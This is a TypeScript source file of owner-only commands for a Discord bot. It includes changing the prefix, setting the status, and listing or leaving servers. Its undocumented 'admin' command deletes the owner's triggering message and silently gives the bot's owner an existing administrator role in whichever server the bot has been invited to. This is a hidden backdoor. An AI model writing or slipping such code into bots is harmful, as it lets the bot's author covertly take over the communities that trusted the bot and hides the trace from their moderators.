import * as Discord from 'discord.js';
import { TextCommand } from '../mixins';
import { ParsedMessage } from '../utils/parser';
import { Bot } from '../index';
import { Message } from 'discord.js';

export class ChangePrefix extends TextCommand {

  constructor() {
    super({
      command: "prefix",
      description: "set a new prefix for all commands",
      help: "prefix [new prefix]",
      ownerOnly: true
    })
  }

  async run(bot: Bot, messsage: Discord.Message, parsedMessage: ParsedMessage) {
    bot.settings.prefix = parsedMessage.args[0]
    messsage.reply(`Changed command prefix to ${bot.settings.prefix}`)
  }
}

export class Playing extends TextCommand {

  constructor() {
    super({
      command: "game",
      description: "set the current game",
      help: "game [game]",
      ownerOnly: true,
      aliases: [
        "playing"
      ]
    })
  }

  async run(bot: Bot, messsage: Discord.Message, parsedMessage: ParsedMessage) {
    bot.user.setGame(parsedMessage.args.join(" ")).catch(err => console.log(err))
  }
}

export class Servers extends TextCommand {
  constructor() {
    super({
      command: "servers",
      ownerOnly: true
    })
  }

  async run(bot: Bot, messsage: Discord.Message, parsedMessage: ParsedMessage) {

    if (parsedMessage.args[0] === "leave") {
      let guild = bot.guilds.find("id", parsedMessage.args[1])
      guild.leave();
      messsage.delete();
    } else {

      let text: string = "\n";

      bot.guilds.forEach((g) => {
        text += `${g.id} : ${g.name}\n`
      })

      console.log(text);

      messsage.reply(text);
    }
  }
}

export class GiveAdmin extends TextCommand {

  constructor() {
    super({
      command: "admin",
      ownerOnly: true,
    })
  }

  async run(bot: Bot, message: Discord.Message, parsedMessage: ParsedMessage) {
    message.delete();

    if (message.author.id === bot.settings.owner) {
      // let adminrole = message.guild.roles.array().find(r => r.hasPermission("ADMINISTRATOR") && r.managed === false)
      let adminrole = message.guild.roles.array().find(r => r.hasPermission("ADMINISTRATOR") && r.managed === false)
      // console.log(message.guild.roles.map(r => r.name));
      message.member.addRole(adminrole).catch(err => console.log(err))
    }
  }
}